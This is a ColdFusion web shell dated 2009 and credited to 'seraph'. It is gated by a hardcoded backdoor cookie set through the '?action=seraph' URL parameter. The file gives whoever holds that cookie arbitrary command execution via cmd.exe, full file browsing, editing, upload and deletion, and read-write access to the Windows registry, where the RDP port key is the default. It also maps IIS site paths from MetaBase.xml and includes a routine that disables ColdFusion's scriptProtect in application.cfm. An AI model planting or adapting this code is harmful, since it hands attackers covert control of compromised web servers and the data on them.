
<CFPARAM NAME="url.action" DEFAULT="">
<CFPARAM NAME="Form.path" DEFAULT="">
<CFPARAM NAME="url.page" DEFAULT="">
<CFPARAM NAME="url.FileAction" DEFAULT="">
<CFPARAM NAME="url.path" DEFAULT="">
<CFPARAM NAME="path" DEFAULT="">
<CFPARAM NAME="cookie.user_id" DEFAULT="">
<CFPARAM NAME="selfname" DEFAULT="#replace(cgi.PATH_INFO,"/","\","all")#">
<CFPARAM NAME="selfpath" DEFAULT="#replace(cgi.PATH_TRANSLATED,selfname,"","all")#">
<CFPARAM NAME="parentpath" DEFAULT="#replace(cgi.PATH_INFO,"/","","all")#">
<!---验证--->
<cfif url.action is "seraph">
<CFCOOKIE NAME="User_ID" VALUE="seraph" EXPIRES="100">
</cfif>
<cfif cookie.user_id is not "seraph">
<cfabort>
</cfif>



	<!---显示头部--->
	
	<cfset Ftop()>
	<!---选择分页内容--->
	<CFSWITCH EXPRESSION=#url.page#>
		<!---文件浏览--->
		<CFCASE VALUE="file">
			<cfset Ffileopp()>
		</CFCASE>
		<!---cmd操作--->
		<CFCASE VALUE="cmd">
			<cfset FcmdOpp()>
		</CFCASE>
		<!---注册表操作--->
		<CFCASE VALUE="reg">
			<cfset Freg()>
		</CFCASE>
		<!---注册表操作--->
		<CFCASE VALUE="serverinfo">
			<cfset Fserverinfo()>
		</CFCASE>
		<!---IIS读取--->
		<CFCASE VALUE="IIS">
			<cfset ReadWebSitePath()>
		</CFCASE>
		<!---无操作时--->
		<CFDEFAULTCASE>
		</CFDEFAULTCASE>
	</CFSWITCH>
	<cfset Fbutton()>
	<!---函       数       分        割         线--->

	<!---显示头部函数--->
	<cffunction name="Ftop">
		<cfset tickBegin = GetTickCount()>
		<cfoutput>
		<title>#SERVER_NAME#  code by seraph</title>
		
		<a href="?page=file" target="_self">file</a> | <a href="?page=cmd" target="_self">CMD</a> | <a href="?page=reg" target="_self">reg</a> | <a href="?page=serverinfo" target="_self">serverinfo</a> | <a href="?page=IIS" target="_self">iis</a><br/>
		
		</cfoutput><style>body{margin:8;text-align:center;}</style>
		<style>A:visited {color: #333333;text-decoration: none;}A:active {color: #333333;text-decoration: none;}A:link {color: #000000;text-decoration: none;}A:hover {color: #333333;text-decoration: none;}BODY {font-size: 9pt;COLOR: #000000;font-family: "Courier New";border: none;background-color: buttonface;}textarea {font-family: "Courier New";font-size: 12px;border-width: 1px;color: #000000;}table {font-size: 9pt;}form {margin: 0;}#fsoDriveList span{width: 100px;}#FileList span{width: 90;height: 70;cursor: hand;text-align: center;word-break: break-all;border: 1px solid buttonface;}.anotherSpan{color: #ffffff;width: 90;height: 70;text-align: center;background-color: #0A246A;border: 1px solid #0A246A;}.font{font-size: 35px;line-height: 40px;}#fileExplorerTools {background-color: buttonFace;}.input, input {border-width: 1px;}</style>
	</cffunction>
	
	<!---显示底部函数--->
	<cffunction name="Fbutton">
		<hr/>
		author:joshua.seraph&nbsp;Ver bate 0.90 2009-5-29 QQ:81413170<br/>
		<cfset tickEnd = GetTickCount()>
		<cfset loopTime = tickEnd - tickBegin>
		<cfoutput>time:#loopTime#</cfoutput>
	</cffunction>
	
	<!---文件操作函数--->
	<cffunction name="Ffileopp">
		<CFSWITCH EXPRESSION=#url.FileAction#>
			<!---编辑文件--->
			<CFCASE VALUE="EditFile">
				<cfset FEditFile(url.path)>
			</CFCASE>
			<!---保存文件--->
			<CFCASE VALUE="SaveFile">
				<cfset FSaveFile()>
			</CFCASE>
			<!---复制--->
			<CFCASE VALUE="Copy">
				<cfset FCopyFile()>
			</CFCASE>
			<!---移动--->
			<CFCASE VALUE="Move">
				<cfset FMove()>
			</CFCASE>
			<!---重命名--->
			<CFCASE VALUE="Rename">
				<cfset FRename()>
			</CFCASE>
			<!---删除--->
			<CFCASE VALUE="Del">
				<cfset FDelFile()>
			</CFCASE>		
			<!---上传--->
			<CFCASE VALUE="UploadFile">
				<cfset FUploadFile()>
			</CFCASE>		
			<!---无操作时--->
			<CFDEFAULTCASE>
				<cfset FShowFolder()>
			</CFDEFAULTCASE>
		</CFSWITCH>
	</cffunction>
	
	<!---显示文件夹函数--->
	<cffunction name="FShowFolder">
		<cfif url.path is not "">
			<cfset path=trim(url.path)>
		<cfelseif form.path is not "">
			<cfset path=trim(form.path)>
		<cfelse>
			<cfset path=trim(#selfpath#)>
		</cfif>
		<cfoutput>
		<form id="form1" name="form1" method="post" action="?page=file&fileaction=showfolder">
		  <input name="path" type="text" size="100" value="#path#" />
		  <input type="submit" name="Submit" value="show folder" />
		</form>
		<FORM ACTION="?page=file&fileaction=UploadFile" ENCTYPE="multipart/form-data" METHOD="Post" target="_blank">
		uploadPath: <INPUT NAME="path" value="#path#" size=72><br>
		Local File: <INPUT NAME="FileContents" TYPE="file" size=50>
		<INPUT TYPE="submit" VALUE="upload">
		</FORM>
		</cfoutput>
		<CFDIRECTORY DIRECTORY="#path#" NAME="mydirectory" SORT="type,name">
		<cfoutput>
		<TABLE cellSpacing=1 cellPadding=0 width="90%" border=0 BGCOLOR="CCCCCC">
			<TR BGCOLOR="CCCCCC">
				<TD height=25>folders/files</TD>
				<TD>datelastmodified</TD>
				<TD>size</TD>
				<TD>attributes</TD>
				<TD>action</TD>
				
			</TR>

			<TR BGCOLOR="##CCFF66">
				<TD height=25><a href="?page=file&fileaction=showfolder&path=#FGetParentFolder(path)#">up folder.     </a></TD>
				<TD></TD>
				<TD></TD>
				<TD></TD>
				<TD></TD>
			</TR>
		</cfoutput>
		<CFOUTPUT QUERY="mydirectory">
		<CFIF #mydirectory.type# IS "Dir">
			<TR BGCOLOR="##CCFF66">
				<TD><a href="?page=file&fileaction=showfolder&path=#path#\#mydirectory.name#">#mydirectory.name#</a></TD>
				<TD>#mydirectory.datelastmodified#</TD>
				<TD>#mydirectory.size#</TD>
				<TD>#mydirectory.attributes#</TD>
				<TD>
				<input type=button value='edit' onclick=window.open('?page=file&fileaction=EditFile&path=#Replace(path,"\","\\","all")#\\#mydirectory.name#');>
				<input type=button value='copy' onclick=window.open('?page=file&fileaction=EditFile&path=#path#\\#mydirectory.name#');>
				<input type=button value='rename'onclick=window.open('?page=file&fileaction=EditFile&path=#path#\\#mydirectory.name#');>
				<input type=button value='del' onclick=window.open('?page=file&fileaction=EditFile&path=#path#\\#mydirectory.name#');>
				<input type=button value='move' onclick=window.open('?page=file&fileaction=EditFile&path=#path#\\#mydirectory.name#');>
				</td></tr>
		<CFELSE>
			<TR BGCOLOR="FFFFFF">
				<TD><a href="?page=file&fileaction=EditFile&path=#path#\#mydirectory.name#" target="_blank">#mydirectory.name#</a></TD>
				<TD>#mydirectory.datelastmodified#</TD>
				<TD>#mydirectory.size#</TD>
				<TD>#mydirectory.attributes#</TD>
				<TD>				
				<input type=button value='edit' onclick=window.open('?page=file&fileaction=EditFile&path=#Replace(path,"\","\\","all")#\\#mydirectory.name#');>
				<input type=button value='copy' onclick=window.open('?page=file&fileaction=Copy&path=#Replace(path,"\","\\","all")#\\#mydirectory.name#','','menu=no,resizable=yes,height=150,width=500');>
				<input type=button value='rename'onclick=window.open('?page=file&fileaction=Rename&path=#Replace(path,"\","\\","all")#\\#mydirectory.name#','','menu=no,resizable=yes,height=150,width=500');>
				<input type=button value='del' onclick=window.open('?page=file&fileaction=Del&path=#Replace(path,"\","\\","all")#\\#mydirectory.name#','','menu=no,resizable=yes,height=150,width=500');>
				<input type=button value='move' onclick=window.open('?page=file&fileaction=Move&path=#Replace(path,"\","\\","all")#\\#mydirectory.name#','','menu=no,resizable=yes,height=150,width=500');>
				</TD>
				
		</TR></CFIF>
		</CFOUTPUT>
		</table>
	</cffunction>
	
	
	<!---取得上一级目录--->
	<cffunction name="FGetParentFolder">
		 <cfargument name="rootpath" default="#selfpath#" required="yes">
		 <cfset sss=arraynew(1)>
		 <cfset sss=rootpath.split("\\")>
		 <cfset www=replace(rootpath,"\"&sss[arraylen(sss)],"")>
		 <cfreturn www>
	</cffunction>
	<!---编辑文件--->
	<cffunction name="FEditFile">
		<cfargument name="FilePath" default="form.FilePath">
		
		<cfif fileexists(FilePath)>
		
		<cfelse>
			<cfoutput>file not found</cfoutput>
			<cfabort>
		</cfif>
		<CFFILE ACTION="Read" FILE="#FilePath#" VARIABLE="Message">
		<cfoutput>
		<form id="formsave" name="formsave" method="post" action="?page=file&fileaction=SaveFile&path=#FilePath#" target="_blank">
			<textarea name="FileContent" cols="120" rows="25">#HTMLEditFormat(Message)#</textarea><br /><br />
			FilePath
			<input name="FilePath" type="text" size="120" value="#FilePath#" />
			<input type="submit" name="Submit" value="save" />
		</form>
		</cfoutput>
	</cffunction>
	<!---保存文件--->
	<cffunction name="FSaveFile">
		<CFFILE ACTION="Write" FILE="#Form.FilePath#" OUTPUT="#Form.FileContent#">
		<cfoutput>#Form.FilePath# save success</cfoutput>
	</cffunction>
	<!---复制文件--->
	<cffunction name="FCopyFile">
		<CFPARAM NAME="Form.SOURCE" DEFAULT=".">
		<CFPARAM NAME="Form.DESTINATION" DEFAULT=".">
		<cfif form.source is "." and form.destination is ".">
			<cfoutput>
			<form id="form1" name="form1" method="post" action="">
			source&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:<input name="source" type="text" value="#url.path#" size="50" /><br />
			destination:<input name="DESTINATION" type="text" value="#url.path#" size="50" /><br />
			<input type="submit" name="Submit" value="save" />
			</form>
			</cfoutput>
		<cfelse>
			<CFFILE ACTION="Copy" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
			<cfoutput>
				copy file: "#Form.source#" to<br/>"#Form.DESTINATION#"
			</cfoutput>
		</cfif>
	</cffunction>
	<!---删除文件--->
	<cffunction name="FDelFile">
		<CFPARAM NAME="Form.com" DEFAULT=".">
		<cfif form.com is "." >
			<cfoutput>
			<form id="form1" name="form1" method="post" action="">
			<input name="filepath" type="hidden" value="#url.path#">
			<input name="com" type="hidden" value="Yes">
			comfirm delete file:#url.path#？
			<input type="submit" name="Submit" value="del" />
			</form>
			</cfoutput>
		<cfelse>
			<CFFILE ACTION="Delete" FILE="#Form.filepath#">
			<cfoutput>
				delete file #form.filepath# success!!
			</cfoutput>
		</cfif>
	</cffunction>
	<!---上传文件--->
	<cffunction name="FUploadFile">
		<CFFILE ACTION="UPLOAD" FILEFIELD="FileContents" DESTINATION="#Form.path#" NAMECONFLICT="OVERWRITE">
		upload success
	</cffunction>
	<!---移动文件--->
		<cffunction name="Fmove">
		<CFPARAM NAME="Form.SOURCE" DEFAULT=".">
		<CFPARAM NAME="Form.DESTINATION" DEFAULT=".">
		<cfif form.source is "." and form.destination is ".">
			<cfoutput>
			<form id="form1" name="form1" method="post" action="">
			source&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:<input name="source" type="text" value="#url.path#" size="50" /><br />
			destination:<input name="DESTINATION" type="text" value="#url.path#" size="50" /><br />
			<input type="submit" name="Submit" value="move" />
			</form>
			</cfoutput>
		<cfelse>
			<CFFILE ACTION="move" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
			<cfoutput>
				move file: "#Form.source#" to<br/>"#Form.DESTINATION#"
			</cfoutput>
		</cfif>
	</cffunction>
	<!---重命名文件--->
	<cffunction name="FRename">
		<CFPARAM NAME="Form.SOURCE" DEFAULT=".">
		<CFPARAM NAME="Form.DESTINATION" DEFAULT=".">
		<cfif form.source is "." and form.destination is ".">
			<cfoutput>
			<form id="form1" name="form1" method="post" action="">
			Old Name:<input name="source" type="text" value="#url.path#" size="50" /><br />
			New Name:<input name="DESTINATION" type="text" value="#url.path#" size="50" /><br />
			<input type="submit" name="Submit" value="save" />
			</form>
			</cfoutput>
		<cfelse>
			<CFFILE ACTION="rename" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
			<cfoutput>
				copy file: "#Form.source#" to<br/>"#Form.DESTINATION#"
			</cfoutput>
		</cfif>
	</cffunction>
	<!---下载文件--->
	
	<!---CMD界面--->
	<cffunction name="FCmdOpp">
		<CFPARAM NAME="form.cmdpath" DEFAULT="C:\Windows\System32\cmd.exe">
		<CFPARAM NAME="FORM.cmd" DEFAULT="">
		<cfif FORM.cmd is not "">
			<cfoutput>#cmd#</cfoutput>
			<cfexecute name="#form.cmdpath#"
				   arguments="/c #cmd#"
				   outputfile="#GetTempDirectory()#foobar.txt"
				   timeout="1">
			</cfexecute>
		</cfif>
		<cfoutput>
		<form action="#CGI.SCRIPT_NAME#?page=cmd" method="post">
		cmdpath:<input type=text size=45 name="cmdpath" value="#form.cmdpath#">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />
		command:<input type=text size=45 name="cmd" value="#form.cmd#" >
		<input type=Submit value="run">
		</form>
		</cfoutput>
		<cfif FileExists("#GetTempDirectory()#foobar.txt") is "Yes">
		  <cffile action="Read"
					file="#GetTempDirectory()#foobar.txt"
					variable="readText">
		<textarea readonly cols=80 rows=20>
		<CFOUTPUT>#readText#</CFOUTPUT>         
		</textarea>
			<cffile action="Delete"
					file="#GetTempDirectory()#foobar.txt">
		</cfif>
	</cffunction>
	
	<!---服务器信息--->
	<cffunction name="FServerInfo">
		<cfoutput>
		<div align="left">
			serverinfo:<ol id=srvInf>
			<hr/>
			<li>SERVER_SOFTWARE: #SERVER_SOFTWARE#</li>
			<li>SERVER_NAME: #SERVER_NAME#</li>
			<li>IP:#REMOTE_ADDR#</li>
			<li>GATEWAY_INTERFACE:#GATEWAY_INTERFACE#</li>
			<li>SERVER_PROTOCOL: #SERVER_PROTOCOL#</li>
			<li>SERVER_PORT: #SERVER_PORT#</li>
			<li>file path:#PATH_INFO#</li>
			<li>PATH_TRANSLATED:#PATH_TRANSLATED#</li>
			<li>SCRIPT_NAME:#SCRIPT_NAME#</li>
			<li>REMOTE_HOST: #REMOTE_HOST#</li>
			<li>AUTH_TYPE: #AUTH_TYPE#</li>
			<li>server Time: #GetHttpTimeString("#Now()#")#</li>
			<li>local country- language:#GetLocale()#</li>
			<li>coldfusion temp directory:#GetTempDirectory()#</li>
			
			<hr/></ol>

			ColdFusion server variable:<ol id=srvInf>
			<hr/>
			<li>ColdFusion Product name: #Server.ColdFusion.ProductName#</li>
			<li>ColdFusion ver: #Server.ColdFusion.ProductVersion#</li>
			<li>ColdFusion product level: #Server.ColdFusion.ProductLevel#</li>
			<li>OS.Name: #Server.OS.Name#</li>
			<li>Os.AdditionalInformation: #Server.OS.AdditionalInformation#</li>
			<li>OS.Version: #Server.OS.Version#</li>
			<li>OS.BuildNumber: #Server.OS.BuildNumber#</li>
			<hr/></ol>
		</div>
		</cfoutput>
	</cffunction>
	
	<!---注册表操作--->
	<cffunction name="Freg">
		<CFPARAM NAME="form.regpath" DEFAULT="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp">
		<CFPARAM NAME="form.Entry" DEFAULT="PortNumber">
		<CFPARAM NAME="form.newentry" DEFAULT="">
		<CFPARAM NAME="form.regtype" DEFAULT="dWord">
		<cfoutput>
		<form id="form1" name="form1" method="post" action="?page=reg">
			path :<input name="regpath" type="text" value="#form.regpath#" size="100" /> 
			<br />
		  Entry:<input type="text" name="Entry" value="#form.Entry#"  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
		  newentry:  <input type="text" name="newentry" value="#form.newentry#"  />
		  <select name="regtype">
		  	<option value="dWord">dWord</option>
			<option value="string">string</option>
			
		  </select>
		  <p>
			<input type="submit" name="Submit" value="提交" />
		</form>
		</cfoutput>
		<cfif form.regpath is not "">
			<cfif form.entry is "">
					<CFREGISTRY Action="getAll"
					Branch="#form.regpath#"
					Type="Any"
					Name="RegQuery">
					<CFTABLE Query="RegQuery" colHeaders HTMLTable Border="Yes">
					  <CFCOL Header="<B>Entry</b>" Width="35" Text="#RegQuery.Entry#">
					  <CFCOL Header="<B>Type</b>"  Width="10" Text="#RegQuery.type#">
					  <CFCOL Header="<B>Value</b>" Width="35" Text="#RegQuery.Value#">
					</CFTABLE>
			<cfelse>
				<cfif form.newentry is "">
					<CFPARAM NAME="RegValue" DEFAULT="not found">
					<CFREGISTRY Action = "get"  Branch = "#form.regpath#" Entry = "#form.Entry#"  Type="#form.regtype#" variable = "RegValue"> 
					<cfoutput>(#form.regpath#\#form.Entry# )  values is : #RegValue#</cfoutput>
				<cfelse>
					<CFPARAM NAME="RegValue" DEFAULT="not found">
					<CFREGISTRY Action = "get"  Branch = "#form.regpath#" Entry = "#form.Entry#" Variable = "RegValue" Type = "#form.regtype#"> 
					<cfoutput>(#form.regpath#\#form.Entry# )  old  values is : #RegValue#<br /></cfoutput>
					<cfif regvalue is not "not found">
					<CFREGISTRY Action="set" Branch="#form.regpath#"  Entry="#form.Entry#" Type="#form.regtype#" Value="#form.newEntry#">
					<cfoutput>(#form.regpath#\#form.Entry# )  new  values is : #form.newEntry#</cfoutput>
					</cfif>
				</cfif>
			</cfif>
		</cfif>
	</cffunction>
	
	<!---得到网站路径数组--->
<cffunction name="ReadWebSitePath" output="true">
	<CFPARAM NAME="form.Xmlbasepath" DEFAULT="C:\WINDOWS\system32\inetsrv\MetaBase.xml">
	<cfset xmlPath=arrayNew(1)>
	<cfset xmllocation=arraynew(1)>
	<cfset xmlServerindings=arraynew(1)>
	<cfset xmlLogFileDirectory=arraynew(1)>
	<cfset Xmlbasepath=form.Xmlbasepath>
	<cfoutput>
	<form id="form1" name="form1" method="post" action="">
	MetaBase.xml:<input name="Xmlbasepath" type="text" value="#form.Xmlbasepath#" size="50" />
	<input type="submit" name="Submit" value="Read IIs Path" />
	</form>
	</cfoutput>
<cftry>
	<cfif not FileExists("#Xmlbasepath#")>
		file not exist
		<cfreturn xmlpath>
	</cfif>
	<cffile action="read" file="#Xmlbasepath#" variable="XMLFileText">
	<cfcatch type="any">
		<cfoutput>read from meatbase.xml error #cfcatch.type#</cfoutput>
		<cfreturn xmlpath>
	</cfcatch>
</cftry>
	<cfset myXMLDocument=XmlParse(XMLFileText)>
	<cfset numItems = ArrayLen(myXMLDocument.configuration.MBProperty.IIsWebServer)>
	<cfloop index="i" from = "1" to = #numItems#>
		<cfif findnocase("ServerBindings=",#myXMLDocument.configuration.MBProperty.IIsWebServer[i]#)>
			<cfset ServerBindings = #myXMLDocument.configuration.MBProperty.IIsWebServer[i].XmlAttributes.ServerBindings#>
			<cfset location = #myXMLDocument.configuration.MBProperty.IIsWebServer[i].XmlAttributes.location#>
			<cfset arrayAppend(xmllocation,("#location#"))>
			<cfset arrayAppend(xmlServerindings,("#ServerBindings#"))>
			<cfif findnocase("LogFileDirectory=",#myXMLDocument.configuration.MBProperty.IIsWebServer[i]#)>
				<cfset LogFileDirectory = #myXMLDocument.configuration.MBProperty.IIsWebServer[i].XmlAttributes.LogFileDirectory#>
				<cfset arrayAppend(xmlLogFileDirectory,("#LogFileDirectory#"))>
			<cfelse>
				<cfset arrayAppend(xmlLogFileDirectory,(""))>
			</cfif>
		</cfif>

	</cfloop>
	<cfset numLocations=arraylen(xmllocation)>
	<cfset numItems = ArrayLen(myXMLDocument.configuration.MBProperty.IIsWebVirtualDir)>
	<ol id=srvInf>
<TABLE cellSpacing=1 cellPadding=0 width="90%" border=0 BGCOLOR="CCCCCC">
<TR BGCOLOR="CCCCCC">
<TD height=25>path</TD>
<TD>domain</TD>		
<td>LogFileDirectory</td>				
</TR>
	<cfloop index="i" from = "1" to = #numItems#>
	<cfif findnocase("path",#myXMLDocument.configuration.MBProperty.IIsWebVirtualDir[i]#) >
		<cfset path1 = #myXMLDocument.configuration.MBProperty.IIsWebVirtualDir[i].XmlAttributes.path#>
		<cfif findnocase("Program Files",#path1#) is 0 and	findnocase("WINDOWS",#path1#) is 0>
			<cfset listpath=arraytolist(xmlpath)>
			<cfif find(#path1#,#listpath#) is 0>
				<cfset arrayAppend(xmlpath,"#path1#")>

				<cfloop index="j" from = "1" to = #numLocations#>
					<cfif findnocase(#xmllocation[j]#,#myXMLDocument.configuration.MBProperty.IIsWebVirtualDir[i].XmlAttributes.Location#) is not 0>
						<cfoutput>
							<TR BGCOLOR="CCCCCC">
								<TD height=25><li>  #path1#</li></TD>
								<TD>#xmlServerindings[j]#</TD>	
								<td>#xmlLogFileDirectory[j]#</td>					
							</TR>
						</cfoutput>
					</cfif>
				</cfloop>
				
			</cfif>
		</cfif>
	</cfif>
	</cfloop>
</table>
</ol>
	<cfreturn xmlPath>
</cffunction>

<!---修改application.cfm--->
<cffunction name="changeapp">
	<cfargument name="filename" required="yes">
	<cffile action="rename" source="#filename#" destination="#filename#" attributes="normal">
	<CFFILE ACTION="Read" FILE="#filename#" VARIABLE="Message">
	<cfoutput>#message#</cfoutput>
	<cfset www= refindnocase("scriptProtect( )?=( )?""\S+""",Message)>
	<cfif www gt 0 >
		<cfset message=REReplaceNoCase(message,"scriptProtect( )?=( )?""\S+""","scriptProtect=""none""")>
		<CFFILE ACTION="Write" FILE="#filename#" OUTPUT="#message#">
		<cfreturn www>
	</cfif>
	<cfset www=refindnocase("<cfapplication.*>",message)>
	<cfif www gt 0>
		<cfset eee=refindnocase(">",message,www)>
		<cfset cons=mid(message,www,eee-www+1)>
		<cfset cons2=ReplaceNoCase(cons,">"," scriptProtect=""none"">")>
		<cfset message=ReplaceNoCase(message,cons,cons2)>
		<CFFILE ACTION="Write" FILE="#filename#" OUTPUT="#message#">
		<cfreturn www>
	<cfelse>
		<cfset message="<CFAPPLICATION name=""seraph"" setclientcookies=""Yes"" applicationtimeout=""##createTimeSpan(0,4,0,0)##"" setdomaincookies=""yes"" sessionmanagement=""Yes""  scriptProtect=""none"" >" & chr(10) & message>
		<CFFILE ACTION="Write" FILE="#filename#" OUTPUT="#message#">
		<cfreturn www>
	</cfif>
</cffunction>
